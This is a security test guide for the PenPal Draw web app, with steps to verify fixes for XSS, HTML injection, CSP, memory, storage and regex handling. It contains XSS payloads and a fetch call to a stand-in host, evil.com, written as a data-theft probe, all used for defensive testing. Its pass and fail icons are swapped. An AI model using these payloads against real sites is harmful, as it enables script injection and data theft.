# Security Test Guide

Use this guide to verify the security fixes are working.

---

## 🧪 Test 1: XSS Prevention in Help Search

**Risk Level:** HIGH (was critical)

### Steps:
1. Open PenPal Draw
2. Press **F1** to open Help
3. In the search box, type: `<script>alert('XSS')</script>`

### Expected Result:
- ❌ **PASS:** No alert popup appears
- ❌ **PASS:** The text `<script>alert('XSS')</script>` appears literally in results
- ✅ **FAIL:** Alert popup appears (XSS vulnerability exists)

### Technical Details:
The search now uses `textContent` instead of `innerHTML` and properly escapes HTML entities.

---

## 🧪 Test 2: HTML Injection in Brush Names

**Risk Level:** MEDIUM

### Steps:
1. Open Brush Creator (click **+** next to tool selector)
2. In "Brush Name" field, type: `<b>Bold</b><script>alert('hack')</script>`
3. Click **Save Brush**

### Expected Result:
- ❌ **PASS:** Brush is saved with name "Bold" (tags stripped)
- ❌ **PASS:** No alert popup
- ❌ **PASS:** Name does not appear in bold in the brush list
- ✅ **FAIL:** Script executes or name renders as HTML

---

## 🧪 Test 3: Content Security Policy

**Risk Level:** LOW

### Steps:
1. Open browser DevTools (F12)
2. Go to Console
3. Type: `fetch('https://evil.com/steal')`

### Expected Result:
- ❌ **PASS:** CSP error appears in console
- ❌ **PASS:** Request is blocked
- ✅ **FAIL:** Request succeeds

### Check CSP Header:
In DevTools → Network → any request → Response Headers, should see:
```
Content-Security-Policy: default-src 'self'; img-src 'self' data: blob:; ...
```

---

## 🧪 Test 4: Memory Management

**Risk Level:** MEDIUM (performance)

### Steps:
1. Draw 1000+ strokes on canvas
2. Check browser DevTools → Memory
3. Continue drawing to 1200+ strokes

### Expected Result:
- ❌ **PASS:** Memory usage stabilizes after ~1000 strokes
- ❌ **PASS:** Console shows "Memory management: Removed X old strokes"
- ✅ **FAIL:** Memory grows unbounded, browser slows down

---

## 🧪 Test 5: localStorage Data Validation

**Risk Level:** MEDIUM

### Steps:
1. Open browser DevTools → Application → Local Storage
2. Find `penpal-shortcuts` key
3. Edit it to: `{invalid json}`
4. Reload the app

### Expected Result:
- ❌ **PASS:** App loads with default shortcuts
- ❌ **PASS:** Console shows "Failed to load shortcuts"
- ❌ **PASS:** App does not crash
- ✅ **FAIL:** App crashes or shows error page

---

## 🧪 Test 6: Search Debouncing

**Risk Level:** LOW (performance)

### Steps:
1. Open Help (F1)
2. Open DevTools → Console
3. Type a long word quickly in search

### Expected Result:
- ❌ **PASS:** Search only executes ~300ms after you stop typing
- ❌ **PASS:** Console doesn't flood with search logs
- ✅ **FAIL:** Every keystroke triggers immediate search

---

## 🧪 Test 7: Regex Injection Prevention

**Risk Level:** MEDIUM

### Steps:
1. Open Help (F1)
2. In search, type special regex characters: `[.*+?^${}()|[]\`

### Expected Result:
- ❌ **PASS:** Search works without errors
- ❌ **PASS:** Console shows no regex errors
- ✅ **FAIL:** Console shows "Invalid regex" errors

---

## 📊 Automated Test Commands

Run these in browser DevTools console:

```javascript
// Test XSS prevention
const help = window.helpSystem;
help.performSearch('<img src=x onerror=alert(1)>');
// Should NOT show alert

// Test brush name sanitization
const toolMgr = window.penpalApp.toolManager;
const maliciousName = '<script>alert(1)</script>Test';
// Brush should be saved with name "Test"

// Test stroke limit
const app = window.penpalApp;
console.log('Max strokes:', app.MAX_STROKES);
console.log('Current strokes:', app.strokes.length);
```

---

## ✅ Security Checklist

| Test | Status |
|------|--------|
| XSS in Help Search | ⬜ Test |
| HTML in Brush Names | ⬜ Test |
| CSP Headers | ⬜ Test |
| Memory Management | ⬜ Test |
| localStorage Validation | ⬜ Test |
| Search Debouncing | ⬜ Test |
| Regex Injection | ⬜ Test |

---

## 🐛 Reporting Issues

If any test fails:
1. Note the test number
2. Check browser console for errors
3. Open an issue at: https://github.com/cms000123456/penpal/issues

Include:
- Test number
- Browser/OS version
- Console error messages
- Steps to reproduce
